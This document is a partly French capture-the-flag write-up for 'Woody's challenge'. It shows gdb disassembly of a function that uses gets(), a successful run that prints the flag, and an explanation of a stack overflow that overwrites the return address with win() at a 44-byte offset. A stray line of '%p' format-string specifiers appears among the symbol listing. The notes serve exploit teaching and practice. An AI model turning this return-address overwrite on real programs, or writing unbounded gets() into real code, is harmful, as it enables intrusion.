# Notes

```bash
woddy git:(main) ✗ nm vuln1 | grep ' T '
 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
08049430 T __libc_csu_fini
080493c0 T __libc_csu_init
08049435 T __x86.get_pc_thunk.bp
080491b0 T __x86.get_pc_thunk.bx
080491a0 T _dl_relocate_static_pie
0804943c T _fini
08049000 T _init
08049160 T _start
0804935b T main
08049308 T vuln
08049276 T win

woddy git:(main) ✗ gdb vuln1
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08049308 <+0>:     endbr32
   0x0804930c <+4>:     push   %ebp
   0x0804930d <+5>:     mov    %esp,%ebp
   0x0804930f <+7>:     push   %ebx
   0x08049310 <+8>:     sub    $0x24,%esp
   0x08049313 <+11>:    call   0x80491b0 <__x86.get_pc_thunk.bx>
   0x08049318 <+16>:    add    $0x2ce8,%ebx
   0x0804931e <+22>:    sub    $0xc,%esp
   0x08049321 <+25>:    lea    -0x1faa(%ebx),%eax
   0x08049327 <+31>:    push   %eax
   0x08049328 <+32>:    call   0x80490e0 <printf@plt>
   0x0804932d <+37>:    add    $0x10,%esp
   0x08049330 <+40>:    sub    $0xc,%esp
   0x08049333 <+43>:    lea    -0x28(%ebp),%eax
   0x08049336 <+46>:    push   %eax
   0x08049337 <+47>:    call   0x80490f0 <gets@plt>
   0x0804933c <+52>:    add    $0x10,%esp
   0x0804933f <+55>:    sub    $0x8,%esp
   0x08049342 <+58>:    lea    -0x28(%ebp),%eax
   0x08049345 <+61>:    push   %eax
   0x08049346 <+62>:    lea    -0x1f91(%ebx),%eax
   0x0804934c <+68>:    push   %eax

woddy git:(main) ✗ python3 test.py 
=== Server Response ===
Welcome to Woody's challenge!
Woody needs your input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv\x04\x08
Woody says: Here's the flag, partner! BDSEC{Woody_Stack_Smash_123}
```

# README - Woody's Challenge Exploit

## Objectif

- Trouver un moyen d’exploiter une faille dans ce programme pour faire exécuter une fonction cachée (`win()` ici).
- Cette fonction `win()` affiche un flag qu’on veut récupérer.

---

## Comment on procède en général ?

1. **Comprendre comment le programme reçoit l’input**

    - Est-ce qu’il utilise une fonction sécurisée ou non ?
    - Ici on voit `gets()`, qui est très dangereux car il ne limite pas la taille de ce que tu envoies.

2. **Comprendre comment le programme stocke cette entrée**

    - Le programme alloue un espace (buffer) en mémoire pour mettre cette chaîne.
    - Si tu envoies plus que la taille du buffer, ça "déborde" en mémoire, écrasant ce qui vient juste après.

3. **Comprendre ce qu’on peut écraser**

    - Dans un programme, derrière ce buffer sur la pile, il y a des variables internes, puis des infos importantes comme :
        - Le pointeur vers la base de la pile précédente (saved EBP)
        - L’adresse de retour (EIP) — l’adresse où le programme va continuer une fois la fonction terminée.

4. **Exploiter ce débordement**

    - En envoyant plus que la taille du buffer, on peut écraser l’adresse de retour.
    - Ça permet de rediriger le programme vers la fonction qu’on veut, ici `win()`.

---

## En résumé, on va :

- Trouver la taille du buffer
- Trouver où se trouve l’adresse de retour par rapport à ce buffer
- Construire une entrée (payload) qui remplira le buffer, puis écrasera l’adresse de retour
- Mettre dans cette adresse de retour l’adresse de la fonction `win()`
- Envoyer ce payload au programme
- Le programme, au retour de la fonction vulnérable, sautera à `win()` et affichera le flag

---

## Notes techniques

- Le buffer est situé à `ebp - 0x28` (40 octets).
- Après le buffer viennent `saved ebp` (4 octets), puis l’adresse de retour (4 octets).
- L’offset à remplir avant l’adresse de retour est donc de 44 octets.
- L’adresse de la fonction `win()` est `0x08049276`.

---

## Exemple de payload

